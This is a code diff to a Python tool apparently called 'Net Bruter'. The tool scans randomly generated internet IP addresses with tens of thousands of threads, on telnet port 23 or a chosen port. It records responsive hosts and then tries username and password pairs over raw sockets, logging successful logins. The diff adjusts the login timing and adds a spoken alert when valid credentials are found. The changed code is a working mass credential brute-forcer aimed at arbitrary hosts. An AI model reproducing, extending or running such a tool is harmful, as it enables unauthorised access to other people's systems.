@@ -18,12 +18,28 @@ from rich.table import Table
 from rich.live import Live
 
 
+# FILE HANDLOADING
+from pathlib import Path
+
+# CREATE MAIN DIR FOR PROGRAM
+base_dir = Path.home() / "Documents" / "NSM Tools" / ".data" / "Net Bruter"
+base_dir.mkdir(parents=True, exist_ok=True)
+
+# CREATE FILE PATHWAYS
+file_scans = base_dir / "total_scans.json"
+file_results = base_dir / "results.txt"
+file_settings = base_dir / "settings.json"
+
+
+
 # INITIALIZE OBJECT
 console = Console()
 console_width = console.size.width
 
 
 class filler_class():
+    """Class no yet in use"""
+
     def __init__(self):
         pass
     
@@ -107,7 +123,7 @@ class random_ip_scanner():
                 # FOR ACTIVE IP LIST
                 if self.type_of_scan == 3:
                     file_name = "active_ip_list.txt"
-                    active = f"{rand}:{self.ports}\n"
+                    active = f"{rand}\n"
                     with open(file_name, "a") as file:
                         file.write(active)
                     console.print(f"[grey]{self.open_ips}.[/grey] [bold blue]Target:[/bold blue] [bold red]{rand}[/bold red] ---> [bold blue]Port:[/bold blue] [bold green]{self.ports}[/bold green]")
@@ -336,6 +352,7 @@ class connection_to_open_port():
                             # GET INITIAL SERVER RESPONSE
                             if first:
                                 try:
+                                    time.sleep(1)
                                     initial_response = s.recv(4096).decode(coder, errors="ignore")
                                     time.sleep(0.5)  # Allow time for the server to get ready
                                     console.print(f"Initial Server Response: {initial_response}")
@@ -345,8 +362,12 @@ class connection_to_open_port():
                                 first = False
 
                             # SEND CREDENTIALS
+                            username_response = s.recv(4096).decode(coder, errors="ignore")
                             s.sendall(f"{username}\n".encode(coder))
-                            time.sleep(.2)
+                            
+                            time.sleep(1.2)
+
+                            password_response = s.recv(4096).decode(coder, errors="ignore")
                             s.sendall(f"{password}\n".encode(coder))
 
                             # RECEIVE RESPONSE
@@ -357,11 +378,33 @@ class connection_to_open_port():
                                 console.print("[red]Could not decode response[/red]")
                                 response = ""
 
+                            
+
                             # CHECK LOGIN SUCCESS
+                            #valid_response = [ "<", ">", "!", "@", "#", "$"]
+                            #valid = any(valid == suc for suc in valid_response)
                             if "welcome" in response or "success" in response:
+                           
+                            #if valid:
                                 msg = f"Login Success: {ip} | Username: {username} | Password: {password}"
                                 console.print(f"[green]{msg}[/green]")
- 
+
+                                # TTS // SPEAK OUT LOUD
+                                def tts(msg):
+                                    import pyttsx3
+                                    engine = pyttsx3.init()
+                                    voices = engine.getProperty('voices')
+                                    engine.setProperty('voice', voices[0].id)
+                                
+                                    engine.say("ALERT")
+                                    time.sleep(1)
+                                    engine.say(msg)
+                                    engine.runAndWait()
+                                
+                                msgg = f"Successfully found valid login credentials"
+                                t = threading.Thread(target=tts,args=(msgg,))
+                                t.start()
+
                                 # TRY TO PRINT THE LOGIN MESSAGE
                                 try:
                                     login_response = s.recv(4096).decode(coder, errors="ignore")
@@ -590,7 +633,20 @@ class user_interface():
 
                 elif choice == "4":
                     ex.clear_screen()
-                    nsm = random_ip_scanner(thread_count=50000, port=23, scan_amount= 10000000,type=3)  # 3 IS FOR CREATING A ACTIVE IP LIST THAT WILL BE SAVED TO A TEXT FILE
+                    
+                    while True:
+
+                        try:
+                            choice = int(input("Enter Port: "))
+                            break
+                        
+                        except Exception as e:
+                            console.print(e)
+                    
+
+
+
+                    nsm = random_ip_scanner(thread_count=50000, port=choice, scan_amount= 10000000,type=3)  # 3 IS FOR CREATING A ACTIVE IP LIST THAT WILL BE SAVED TO A TEXT FILE
                     nsm.loop_controller()
                     file_name = "active_ip_list.txt"
                     letter = f"\n\n\nTotal Active IP's Found: {nsm.open_ips}"
@@ -622,9 +678,9 @@ class data():
     """Responsible for storing data and also reading that said data"""
 
     def __init__(self):
-        self.file_path_total_scans = "vuln_finder_total_scans.json"    # FOR TRACKING AMOUNT OF TOTAL IPS SCANNED
-        self.file_path_scan_results = "vuln_finder_scan_results.txt"   # FOR SCAN SAVE RESULTS // LIKE GEO INFO, OPEN PORTS AND IP ADDRESS
-        self.file_path_user_setting = "vuln_finder_user_setting.json"  # FOR USER SAVED SETTINGS
+        self.file_path_total_scans = file_scans    # FOR TRACKING AMOUNT OF TOTAL IPS SCANNED
+        self.file_path_scan_results = file_results   # FOR SCAN SAVE RESULTS // LIKE GEO INFO, OPEN PORTS AND IP ADDRESS
+        self.file_path_user_setting = file_settings  # FOR USER SAVED SETTINGS
         self.indent_amount = 4     # ENSURES THAT IT STAYS THE SAME DYNAMICALLY
         
 
@@ -840,3 +896,4 @@ if __name__ ==  "__main__":
 # GUI == V.2.0
 
 
+ 
